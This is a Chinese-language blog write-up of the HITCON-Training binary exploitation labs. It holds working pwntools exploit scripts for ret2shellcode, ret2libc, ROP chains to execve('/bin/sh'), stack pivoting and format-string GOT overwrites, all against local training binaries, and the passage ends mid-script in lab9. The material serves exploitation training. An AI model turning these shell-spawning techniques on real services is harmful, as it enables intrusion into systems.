<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="author" content="Marlon Cabrera Oliveira">
    <meta name="description" content="Hugo theme using tachyons.io & geomicons.com">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|PT+Mono&amp;subset=latin,cyrillic">
    <link rel="stylesheet" href="/css/tachyons.css">
    <style>
        .geomicon { width: 1.5em; height: 1.5em; color: #405660; }
        body{ font-family:'PT Sans', sans-serif; }
    </style>
  </head>
  <body>
      <header class="tc pal bb b-near-white">
    <h1 class="f6 thin i link-child"><a href="/">M4x's Blog</a></h1>
        <nav>
          <ul class="list pln">
            <li class="dib prm"><a href="/post"><span class="js-geomicon geomicon" data-icon="compose"></span>Home</a></li>
            <li class="dib prm"><a href="/stuff/myworks"><span class="js-geomicon geomicon" data-icon="play"></span>Works</a></li>
            <li class="dib prm"><a href="/stuff/aboutme"><span class="js-geomicon geomicon" data-icon="user"></span>About</a></li>
            <li class="dib prm"><a href="http://www.cnblogs.com/WangAoBo/"><span class="js-geomicon geomicon" data-icon="link"></span>Old Blog Link</a></li>
          </ul>
        </nav>
        </header>


  <main class="pal">

    <h1>HITCON-Training-Writeup</h1>
    <h2>Jul 13, 2018</h2>
      

<h1 id="hitcon-training-writeup">HITCON-Training-Writeup</h1>

<blockquote>
<p>原文链接<a href="http://www.cnblogs.com/WangAoBo/p/8570640.html">M4x@10.0.0.55</a></p>

<p>项目地址<a href="https://github.com/0x01f/HITCON-Training-Writeup">M4x&rsquo;s github</a>，欢迎 star~</p>

<p>更新时间5月16</p>
</blockquote>

<p>复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：<a href="https://github.com/scwuaptx/HITCON-Training">https://github.com/scwuaptx/HITCON-Training</a></p>

<h2 id="outline">Outline</h2>

<ul>
<li>Basic Knowledge

<ul>
<li>Introduction</li>
<li>Reverse Engineering

<ul>
<li>Static Analysis</li>
<li>Dynamic Analysis</li>
</ul></li>
<li>Exploitation</li>
<li>Useful Tool

<ul>
<li>IDA PRO</li>
<li>GDB</li>
<li>Pwntool</li>
</ul></li>
<li>lab 1 - sysmagic</li>
<li>Section</li>
<li>Compile,linking,assmbler</li>
<li>Execution</li>
<li>how program get run</li>
<li>Segment</li>
<li>x86 assembly</li>
<li>Calling convention</li>
<li>lab 2 - open/read/write</li>
<li>shellcoding</li>
</ul></li>
<li>Stack Overflow

<ul>
<li>Buffer Overflow</li>
<li>Return to Text/Shellcode</li>
<li>lab 3 - ret2shellcode</li>
<li>Protection</li>
<li>ASLR/DEP/PIE/StackGuard</li>
<li>Lazy binding</li>
<li>Return to Library</li>
<li>lab 4 - ret2lib</li>
</ul></li>
<li>Return Oriented Programming

<ul>
<li>ROP</li>
<li>lab 5 - simple rop</li>
<li>Using ROP bypass ASLR</li>
<li>ret2plt</li>
<li>Stack migration</li>
<li>lab 6 - migration</li>
</ul></li>
<li>Format String Attack

<ul>
<li>Format String</li>
<li>Read from arbitrary memory</li>
<li>lab 7 - crack</li>
<li>Write to arbitrary memory</li>
<li>lab 8 - craxme</li>
<li>Advanced Trick</li>
<li>EBP chain</li>
<li>lab 9 - playfmt</li>
</ul></li>
<li>x64 Binary Exploitation

<ul>
<li>x64 assembly</li>
<li>ROP</li>
<li>Format string Attack</li>
</ul></li>
<li>Heap exploitation

<ul>
<li>Glibc memory allocator overview</li>
<li>Vulnerablility on heap</li>
<li>Use after free

<ul>
<li>lab 10 - hacknote</li>
</ul></li>
<li>Heap overflow

<ul>
<li>house of force</li>
<li>lab 11 - 1 - bamboobox1</li>
<li>unlink</li>
<li>lab 11 - 2 - bamboobox2</li>
</ul></li>
</ul></li>
<li>Advanced heap exploitation

<ul>
<li>Fastbin attack</li>
<li>lab 12 - babysecretgarden</li>
<li>Shrink the chunk</li>
<li>Extend the chunk</li>
<li>lab 13 - heapcreator</li>
<li>Unsortbin attack</li>
<li>lab 14 - magicheap</li>
</ul></li>
<li>C++ Exploitation

<ul>
<li>Name Mangling</li>
<li>Vtable fucntion table</li>
<li>Vector &amp; String</li>
<li>New &amp; delete</li>
<li>Copy constructor &amp; assignment operator</li>
<li>lab 15 - zoo</li>
</ul></li>
</ul>

<h2 id="writeup">Writeup</h2>

<h3 id="lab1-sysmagic">lab1-sysmagic</h3>

<p>一个很简单的逆向题，看 get_flag 函数的逻辑逆回来即可，直接逆向的方法就不说了</p>

<p>或者经过观察，flag 的生成与输入无关，因此可以通过 patch 或者调试直接获得 flag</p>

<h4 id="patch">patch</h4>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmdngq8j30ja047dg7.jpg" alt="" /></p>

<p>修改关键判断即可，patch 后保存运行，输入任意值即可得 flag</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmkyf79j30ez03emxy.jpg" alt="" /></p>

<h4 id="调试">调试</h4>

<p>通过观察汇编，我们只需使下图的 cmp 满足即可，可以通过 gdb 调试，在调试过程中手动满足该条件</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpngmh9cj30f904gdfx.jpg" alt="" /></p>

<p>直接写出 gdb 脚本</p>

<pre><code class="language-shell">lab1 [master●●] cat solve 
b *get_flag+389
r
#your input
set $eax=$edx
c
lab1 [master●●] 
</code></pre>

<p>也可得到 flag</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmxbneij30qu0c5dll.jpg" alt="" /></p>

<p>同时注意，IDA 对字符串的识别出了问题，修复方法可以参考 inndy 的 <a href="http://www.cnblogs.com/WangAoBo/p/7706719.html"><strong>ROP2</strong></a></p>

<h3 id="lab2-orw-bin">lab2-orw.bin</h3>

<p>通过查看 prctl 的 man 手册发现该程序限制了一部分系统调用，根据题目的名字 open, read, write以及IDA分析，很明显是要我们自己写读取并打印 flag 的 shellcode 了，偷个懒，直接调用 shellcraft 模块</p>

<pre><code class="language-python">lab2 [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from pwn import shellcraft as sc
context.log_level = &quot;debug&quot;

shellcode = sc.pushstr(&quot;/home/m4x/HITCON-Training/LAB/lab2/testFlag&quot;)
shellcode += sc.open(&quot;esp&quot;)
#  open返回的文件文件描述符存贮在eax寄存器里 
shellcode += sc.read(&quot;eax&quot;, &quot;esp&quot;, 0x100)
#  open读取的内容放在栈顶 
shellcode += sc.write(1, &quot;esp&quot;, 0x100)

io = process(&quot;./orw.bin&quot;)
io.sendlineafter(&quot;shellcode:&quot;, asm(shellcode))
print io.recvall()
io.close()
lab2 [master●●] 
</code></pre>

<p>该题与 pwnable.tw 的 orw 类似，那道题的 writeup 很多，因此就不说直接撸汇编的方法了</p>

<h3 id="lab3-ret2sc">lab3-ret2sc</h3>

<p>很简单的 ret2shellcode，程序没有开启 NX 和 canary 保护，把 shellcode 存贮在 name 这个全局变量上，并 ret 到该地址即可</p>

<pre><code class="language-python">lab3 [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(os = &quot;linux&quot;, arch = &quot;i386&quot;)

io = process(&quot;./ret2sc&quot;)

shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))
io.sendlineafter(&quot;:&quot;, shellcode)

payload = flat(cyclic(32), 0x804a060)
io.sendlineafter(&quot;:&quot;, payload)

io.interactive()
io.close()
lab3 [master●●] 
</code></pre>

<p>需要注意的是，该程序中的 read 是通过 esp 寻址的，因此具体的 offset 可以通过调试查看</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpljuki5j30g702wdfy.jpg" alt="" /></p>

<p>也可以通过 peda 的 pattern_offset/pattern_search , pwntools 的 cyclic/cyclic -l 等工具来找 offset</p>

<h3 id="lab4-ret2lib">lab4-ret2lib</h3>

<p>ret2libc，并且程序中已经有了一个可以查看 got 表中值的函数 See_something，直接 leak 出 libcBase，通过 one_gadget 或者 system(&ldquo;/bin/sh&rdquo;) 都可以 get shell，/bin/sh 可以使用 libc 中的字符串，可以通过 read 读入到内存中，也可以使用 binary 中的字符串</p>

<pre><code class="language-python">lab4 [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

io = process(&quot;./ret2lib&quot;)
elf = ELF(&quot;./ret2lib&quot;)
libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)

io.sendlineafter(&quot; :&quot;, str(elf.got[&quot;puts&quot;]))
io.recvuntil(&quot; : &quot;)
libcBase = int(io.recvuntil(&quot;\n&quot;, drop = True), 16) - libc.symbols[&quot;puts&quot;]

success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
#  oneGadget = libcBase + 0x3a9fc

#  payload = flat(cyclic(60), oneGadget)
payload = flat(cyclic(60), libcBase + libc.symbols[&quot;system&quot;], 0xdeadbeef, next(elf.search(&quot;sh\x00&quot;)))
io.sendlineafter(&quot; :&quot;, payload)

io.interactive()
io.close()
lab4 [master●●] 
</code></pre>

<h3 id="lab5-simplerop">lab5-simplerop</h3>

<p>本来看程序是静态链接的，想通过 ROPgadget/ropper 等工具生成的 ropchain 一波带走，但实际操作时发现 read 函数只允许读入100个字符，去除 buf 到 main 函数返回地址的偏移为 32，我们一共有 100 - 32 = 68 的长度来构造 ropchain，而 ropper/ROPgadget 等自动生成的 ropchain 都大于这个长度，这就需要我们精心设计 ropchain 了，这里偷个懒，优化一下 ropper 生成的 ropchain 来缩短长度</p>

<blockquote>
<p>ropper &ndash;file ./simplerop &ndash;chain &ldquo;execve cmd=/bin/sh&rdquo;</p>

<p>ROPgadget &ndash;binary ./simplerop &ndash;ropchain</p>
</blockquote>

<p>先看一下 ropper 生成的 ropchain</p>

<pre><code class="language-python">#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # ./simplerop
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3064)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += p(0x00000000)
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3068)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
rop += rebase_0(0x000a3068)
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3068)
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
print rop
[INFO] rop chain generated!
</code></pre>

<p>简单介绍一下原理，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(&ldquo;/bin/sh&rdquo;, 0, 0)，hackme.inndy 上也有一道类似的题目<a href="http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3"><strong>ROP2</strong></a></p>

<p>而当观察 ropper 等工具自动生成的 ropchain 时，会发现有很多步骤是很繁琐的，可以做出很多优化，给一个优化后的例子</p>

<pre><code class="language-python">#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # ./simplerop
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

pop_edx_ecx_ebx = 0x0806e850

rop = ''

# write /bin/sh\x00 to 0x08048000 + 0x000a3060
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
#  rop += '//bi'
rop += '/bin'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += '/sh\x00'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3064)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
print &quot;[+]write /bin/sh\x00 to 0x08048000 + 0x000a3060&quot;

#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
#  rop += p(0x00000000)
#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
#  rop += rebase_0(0x000a3068)
#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
#  rop += rebase_0(0x000a3060)
#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
#  rop += rebase_0(0x000a3068)
#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
#  rop += rebase_0(0x000a3068)

# set ebx -&gt; /bin/sh\x00, ecx = edx = 0
rop += pack('I', pop_edx_ecx_ebx)
rop += p(0)
rop += p(0)
rop += rebase_0(0x000a3060)
print &quot;[+]set ebx -&gt; /bin/sh\x00, ecx = edx = 0&quot;

rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
asset len(rop) &lt;= 100 - 32
</code></pre>

<p>注释都已经写在代码里了，主要优化了将 /bin/sh\x00 读入以及设置 ebx，ecx，edx 等寄存器的过程</p>

<blockquote>
<p>或者直接 return 到 read 函数，将 /bin/sh\x00 read 到 bss/data 段，能得到更短的 ropchain, 解决方法有很多,不再细说</p>
</blockquote>

<p>最终脚本:</p>

<pre><code class="language-python">lab5 [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # ./simplerop
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

pop_edx_ecx_ebx = 0x0806e850

rop = ''

# write /bin/sh\x00 to 0x08048000 + 0x000a3060
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
#  rop += '//bi'
rop += '/bin'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += '/sh\x00'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3064)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
print &quot;[+]write /bin/sh\x00 to 0x08048000 + 0x000a3060&quot;

#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
#  rop += p(0x00000000)
#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
#  rop += rebase_0(0x000a3068)
#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
#  rop += rebase_0(0x000a3060)
#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
#  rop += rebase_0(0x000a3068)
#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
#  rop += rebase_0(0x000a3068)

# set ebx -&gt; /bin/sh\x00, ecx = edx = 0
rop += pack('I', pop_edx_ecx_ebx)
rop += p(0)
rop += p(0)
rop += rebase_0(0x000a3060)
print &quot;[+]set ebx -&gt; /bin/sh\x00, ecx = edx = 0&quot;

rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
assert len(rop) &lt;= 100 - 32

io = process(&quot;./simplerop&quot;)

payload = cyclic(32) + rop
io.sendlineafter(&quot; :&quot;, payload)

io.interactive()
io.close()
</code></pre>

<h3 id="lab6-migration">lab6-migration</h3>

<p>栈迁移的问题，可以看出这个题目比起暴力的栈溢出做了两点限制：</p>

<ul>
<li><p>每次溢出只有 0x40-0x28-0x4=<strong>20</strong> 个字节的长度可以构造 ropchain</p></li>

<li><p>通过</p></li>
</ul>

<pre><code class="language-C">    if ( count != 1337 )
      exit(1);
</code></pre>

<p>限制了我们只能利用一次 main 函数的溢出（直接控制 main 返回到 exit 后的话，程序的栈结构会乱掉）</p>

<p>所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A"><strong>slide</strong></a></p>

<p><img src="https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg" alt="stackPivot" /></p>

<p>我的exp：</p>

<pre><code class="language-python">lab6 [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
context.log_level = &quot;debug&quot;
context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;] 
def DEBUG():
    raw_input(&quot;DEBUG: &quot;)
    gdb.attach(io)

elf = ELF(&quot;./migration&quot;)
libc = elf.libc

#  bufAddr = elf.bss()
bufAddr = 0x0804a000
readPlt = elf.plt[&quot;read&quot;]
readGot = elf.got[&quot;read&quot;]
putsPlt = elf.plt[&quot;puts&quot;]
p1ret = 0x0804836d
p3ret = 0x08048569
leaveRet = 0x08048504


io = process(&quot;./migration&quot;)
#  DEBUG()
payload = flat([cyclic(0x28), bufAddr + 0x100, readPlt, leaveRet, 0, bufAddr + 0x100, 0x100])
io.sendafter(&quot; :\n&quot;, payload)
sleep(0.1)

payload = flat([bufAddr + 0x600, putsPlt, p1ret, readGot, readPlt, leaveRet, 0, bufAddr + 0x600, 0x100])
io.send(payload)
sleep(0.1)
#  print io.recv()
libcBase = u32(io.recv()[: 4]) - libc.sym['read']
success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
pause()

payload = flat([bufAddr + 0x100, readPlt, p3ret, 0, bufAddr + 0x100, 0x100, libcBase + libc.sym['system'], 0xdeadbeef, bufAddr + 0x100])
io.send(payload)
sleep(0.1)
io.send(&quot;$0\0&quot;)
sleep(0.1)

io.interactive()
io.close()
</code></pre>

<p>稍微解释一下，先通过主函数中可以控制的 20个 字节将 esp 指针劫持到可控的 bss 段，然后就可以为所欲为了。</p>

<p>关于 stack-pivot，pwnable.kr 的 simple_login 是很经典的题目，放上一篇这道题的很不错的 <a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049"><strong>wp</strong></a></p>

<p>这个还有个问题，sendline 会 gg，send 就可以，在 atum 大佬的 <a href="http://atum.li/2016/09/20/ctf-strange/"><strong>博客</strong></a> 上找到了原因
另外不建议把迁移后的栈放在 bss 段开头, 因为 stdout, stdin, stderr 等结构体往往存储在这里, 破坏这些结构体很可能会引起输入输出的错误</p>

<h3 id="lab7-crack">lab7-crack</h3>

<p>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(&ldquo;cat flag&rdquo;) 处（注意 printf 实际调用了 puts）</p>

<pre><code class="language-python">lab7 [master●●] cat hijack.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

putsGot = 0x804A01C
bullet = 0x804872B

io = process(&quot;./crack&quot;)
payload = fmtstr_payload(10, {putsGot: bullet})
io.sendlineafter(&quot; ? &quot;, payload)

io.sendline()
io.interactive()
io.close()
lab7 [master●●] cat overwrite.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

pwdAddr = 0x804A048
payload = fmtstr_payload(10, {pwdAddr: 6})

io = process(&quot;./crack&quot;)

io.sendlineafter(&quot; ? &quot;, payload)
io.sendlineafter(&quot; :&quot;, &quot;6&quot;)

io.interactive()
io.close()
lab7 [master●●] cat leak.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

pwdAddr = 0x804A048
payload = p32(pwdAddr) + &quot;|%10$s||&quot;

io = process(&quot;./crack&quot;)
io.sendlineafter(&quot; ? &quot;, payload)
io.recvuntil(&quot;|&quot;)
leaked = u32(io.recvuntil(&quot;||&quot;, drop = True))
io.sendlineafter(&quot; :&quot;, str(leaked))

io.interactive()
io.close()
</code></pre>

<p>32位的 binary 可以直接使用 pwntools 封装好的<strong>fmtstr_payload</strong>函数：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq2zoc31gjj30om0p3jv2.jpg" alt="" /></p>

<h3 id="lab8-craxme">lab8-craxme</h3>

<p>同样是32位的 fsb，直接用 fmtstr_payload 就可以解决</p>

<pre><code class="language-python">lab8 [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from sys import argv
context.log_level = &quot;debug&quot;

magicAddr = ELF(&quot;./craxme&quot;).sym[&quot;magic&quot;]

if argv[1] == &quot;1&quot;:
    payload = fmtstr_payload(7, {magicAddr: 0xda})
else:
    payload = fmtstr_payload(7, {magicAddr: 0xfaceb00c})

io = process(&quot;./craxme&quot;)
io.sendlineafter(&quot; :&quot;, payload)
io.interactive()
io.close()
</code></pre>

<p>如果想要自己实现 fmtstr_payload 功能，可以参考这篇 <a href="https://paper.seebug.org/246/"><strong>文章</strong></a></p>

<h3 id="lab9-playfmt">lab9-playfmt</h3>

<p>和上一道题相比, lab9 的格式化字符串不在栈上,在全局变量 (.bss) 段, 因此我们就不能直接控制栈上的变量来进行修改 got 等行为,但可以通过控制</p>

<pre><code class="language-assembly">Breakpoint *do_fmt+64
pwndbg&gt; stack 25
00:0000│ esp  0xffffd0c0 —▸ 0x804a060 (buf) ◂— 0xa7025 /* '%p\n' */
01:0004│      0xffffd0c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffffd0c8 ◂— 0x4
03:000c│      0xffffd0cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffffd0d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffffd0d4 —▸ 0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffffd0d8 —▸ 0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
07:001c│      0xffffd0dc —▸ 0x8048584 (play+59) ◂— nop    
08:0020│      0xffffd0e0 —▸ 0xf7fa4d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffffd0e4 ◂— 0x0
0a:0028│      0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
0b:002c│      0xffffd0ec —▸ 0x80485b1 (main+42) ◂— nop    
0c:0030│      0xffffd0f0 —▸ 0xf7fa43dc (__exit_funcs) —▸ 0xf7fa51e0 (initial) ◂— 0x0
0d:0034│      0xffffd0f4 —▸ 0xffffd110 ◂— 0x1
0e:0038│      0xffffd0f8 ◂— 0x0
0f:003c│      0xffffd0fc —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffffd100 ◂— 0x1
11:0044│      0xffffd104 —▸ 0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffffd108 ◂— 0x0
13:004c│      0xffffd10c —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffffd110 ◂— 0x1
15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd342 ◂— 0x6d6f682f ('/hom')
16:0058│      0xffffd118 —▸ 0xffffd1ac —▸ 0xffffd375 ◂— 0x5f474458 ('XDG_')
17:005c│      0xffffd11c ◂— 0x0
... ↓
pwndbg&gt; 
</code></pre>

<p>如上 0x15, 0x16, 0x06 出的指针指向栈上的变量, 如修改 0x15 处为</p>

<pre><code class="language-assembly">15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)
</code></pre>

<p>然后再将 0x8048584 修改为某个 got 地址, 就可以实现间接地写 got 了, 这种方式也基本成了一种固定的套路, 如 hackme.inndy 的 <a href="https://github.com/0x01f/pwn_repo/tree/master/inndy_echo3">echo3</a> 一道题</p>

<h4 id="exp">exp</h4>

<p>为了解释清楚整个利用的过程, 我把我调试时的信息也放到脚本里了</p>

<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = 'i386'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process(&quot;./playfmt&quot;)
libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
elf = ELF(&quot;./playfmt&quot;)

'''
Breakpoint *do_fmt+64
pwndbg&gt; x/3s 0x804a060
0x804a060 &lt;buf&gt;:	&quot;..%8$p....%6$p.&quot;...
0x804a06f &lt;buf+15&gt;:	&quot;.11111111&quot;
0x804a079 &lt;buf+25&gt;:	&quot;&quot;
pwndbg&gt; stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e ('..%8')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'
17:005c│      0xffa0781c ◂— 0x0
... ↓
'''
gdb.attach(io, &quot;b *do_fmt+64\nc&quot;)
io.send(&quot;..%8$p....%6$p..11111111\0&quot;)
io.recvuntil(&quot;..&quot;)
libc.address = int(io.recvuntil(&quot;..&quot;, drop = True), 16) - libc.sym['_IO_2_1_stdout_']
success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))
io.recvuntil(&quot;..&quot;)
stack = int(io.recvuntil(&quot;..&quot;, drop = True), 16) - 0x28
success(&quot;stack -&gt; {:#x}&quot;.format(stack))
pause()

'''
pwndbg&gt; x/3s 0x804a060
0x804a060 &lt;buf&gt;:	&quot;%30684c%21$hn%1&quot;...
0x804a06f &lt;buf+15&gt;:	&quot;6c%22$hn2222222&quot;...
0x804a07e &lt;buf+30&gt;:	&quot;2&quot;
pwndbg&gt; stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 ('%306')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
